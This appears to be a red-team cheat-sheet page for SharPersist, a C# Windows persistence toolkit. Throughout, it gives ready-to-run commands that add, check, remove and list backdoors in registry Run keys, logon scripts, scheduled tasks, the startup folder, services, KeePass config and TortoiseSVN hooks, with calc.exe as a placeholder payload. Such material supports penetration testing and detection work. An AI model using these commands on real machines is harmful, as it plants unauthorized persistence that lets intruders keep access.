---
description: 'Windows persistence toolkit written in C#'
---

# SharpPersist

Windows persistence toolkit written in C\# 

Link:  [https://github.com/fireeye/SharPersist](https://github.com/fireeye/SharPersist) 

## Examples 

### Adding Persistence Triggers \(Add\) 

#### KeePass 

SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add 

#### Registry 

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add 

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env 

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add 

#### Scheduled Task Backdoor 

SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add 

#### Startup Folder 

SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add 

#### Tortoise SVN 

SharPersist -t tortoisesvn -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -m add 

#### Windows Service 

SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add 

#### Scheduled Task 

SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 &gt;&gt; c:\123.txt" -n "Some Task" -m add 

SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 &gt;&gt; c:\123.txt" -n "Some Task" -m add -o hourly 

### Removing Persistence Triggers \(Remove\) 

#### KeePass 

SharPersist -t keepass -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m remove 

#### Registry 

SharPersist -t reg -k "hkcurun" -v "Test Stuff" -m remove 

SharPersist -t reg -k "hkcurun" -v "Test Stuff" -m remove -o env 

SharPersist -t reg -k "logonscript" -m remove 

#### Scheduled Task Backdoor 

SharPersist -t schtaskbackdoor -n "Something Cool" -m remove 

#### Startup Folder 

SharPersist -t startupfolder -f "Some File" -m remove 

#### Tortoise SVN 

SharPersist -t tortoisesvn -m remove 

#### Windows Service 

SharPersist -t service -n "Some Service" -m remove 

#### Scheduled Task 

SharPersist -t schtask -n "Some Task" -m remove 

### Perform Dry Run of Persistence Trigger \(Check\) 

#### KeePass 

SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m check 

#### Registry 

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m check 

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m check -o env 

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m check 

#### Scheduled Task Backdoor 

SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m check 

#### Startup Folder 

SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m check 

#### Tortoise SVN 

SharPersist -t tortoisesvn -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -m check 

#### Windows Service 

SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m check 

#### Scheduled Task 

SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 &gt;&gt; c:\123.txt" -n "Some Task" -m check 

SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 &gt;&gt; c:\123.txt" -n "Some Task" -m check -o hourly 

### List Persistence Trigger Entries \(List\) 

#### Registry 

SharPersist -t reg -k "hkcurun" -m list 

Scheduled Task Backdoor 

SharPersist -t schtaskbackdoor -m list 

SharPersist -t schtaskbackdoor -m list -n "Some Task" 

SharPersist -t schtaskbackdoor -m list -o logon 

#### Startup Folder 

SharPersist -t startupfolder -m list 

#### Windows Service 

SharPersist -t service -m list 

SharPersist -t service -m list -n "Some Service" 

#### Scheduled Task 

SharPersist -t schtask -m list 

SharPersist -t schtask -m list -n "Some Task" 

SharPersist -t schtask -m list -o logon 

